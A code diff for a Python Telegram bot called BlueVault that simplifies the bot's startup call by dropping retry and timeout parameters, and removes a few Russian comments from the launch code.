@@ -300,17 +300,12 @@ async def handle_all_messages(event):
     elif event.sender_id in verification_sessions and text and not text.startswith('/'):
         await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {text}')
 
-# ====================== ЗАПУСК ======================
+# ===# ====================== ЗАПУСК ======================
 async def main():
     try:
         logger.info("🔄 Подключение к Telegram...")
-        await bot.start(
-            bot_token=BOT_TOKEN,
-            connection_retries=5,
-            retry_delay=3,
-            timeout=30,
-            request_retries=5
-        )
+        # Упрощённый запуск без неподдерживаемых параметров
+        await bot.start(bot_token=BOT_TOKEN)
         logger.info("✅ Бот BlueVault успешно запущен и авторизован")
         await bot.run_until_disconnected()
     except Exception as e:
@@ -324,8 +319,5 @@ def run_flask():
     app.run(host='0.0.0.0', port=port, debug=False)
 
 if __name__ == '__main__':
-    # Запускаем Flask в отдельном потоке
     Thread(target=run_flask, daemon=True).start()
-    
-    # Запускаем Telegram бота в главном цикле
     loop.run_until_complete(main())
